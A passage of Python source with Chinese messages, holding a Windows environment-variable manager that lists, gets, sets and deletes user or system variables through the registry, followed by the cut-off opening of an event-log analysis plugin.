        else (win32con.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Session Manager\Environment")
    try:
        if a == 'list':
            key = win32api.RegOpenKeyEx(hive, root, 0, win32con.KEY_READ)
            out = [f"[ENV {s.upper()}] 共 {win32api.RegQueryInfoKey(key)[0]} 项:"]
            i = 0
            while True:
                try:
                    vn, vv, _ = win32api.RegEnumValue(key, i)
                    shown = vv
                    if not expand:
                        shown = vv if len(vv) < 120 else vv[:117] + '...'
                    out.append(f"  {vn} = {shown}")
                    i += 1
                except Exception:
                    break
            win32api.RegCloseKey(key)
            return "\n".join(out)
        if not name:
            return "[ERROR] 需要 name 参数"
        if a == 'get':
            try:
                key = win32api.RegOpenKeyEx(hive, root, 0, win32con.KEY_READ)
                vv, vt = win32api.RegQueryValueEx(key, name)
                win32api.RegCloseKey(key)
                kind = 'EXPAND' if vt == 2 else 'SZ'
                return f"[ENV {s.upper()}] {name} ({kind}) = {vv}"
            except Exception:
                return f"[ENV] {s} 级变量 {name!r} 不存在"
        if a == 'set':
            if not value and value != '0':
                return "[ERROR] set 需要 value 参数"
            key = win32api.RegOpenKeyEx(hive, root, 0, win32con.KEY_SET_VALUE)
            vt = win32con.REG_EXPAND_SZ if '%' in value else win32con.REG_SZ
            win32api.RegSetValueEx(key, name, 0, vt, value)
            win32api.RegCloseKey(key)
            win32gui.PostMessage(0xFFFF, 0x001A, 0, 0)  # HWND_BROADCAST WM_SETTINGCHANGE
            return f"[ENV OK] 已设置 {s} 级 {name} = {value}（已广播变更，新进程生效）"
        if a == 'delete':
            try:
                key = win32api.RegOpenKeyEx(hive, root, 0, win32con.KEY_SET_VALUE)
                win32api.RegDeleteValue(key, name)
                win32api.RegCloseKey(key)
                win32gui.PostMessage(0xFFFF, 0x001A, 0, 0)
                return f"[ENV OK] 已删除 {s} 级变量 {name}"
            except Exception:
                return f"[ENV] {s} 级变量 {name!r} 不存在，无法删除"
        return f"[ERROR] 未知 action: {a}（list/get/set/delete）"
    except Exception as e:
        return f"[ERROR] 环境变量操作失败: {e}"

# === from event_log_analyzer.plugin ===
def _event_log_analyzer(self, log_name: str = "Security", hours_back: int = 24, min_events: int = 5, export_path: str = "") -> str:
    """
    事件日志分析器 - 深度检测安全威胁
    """
    try:
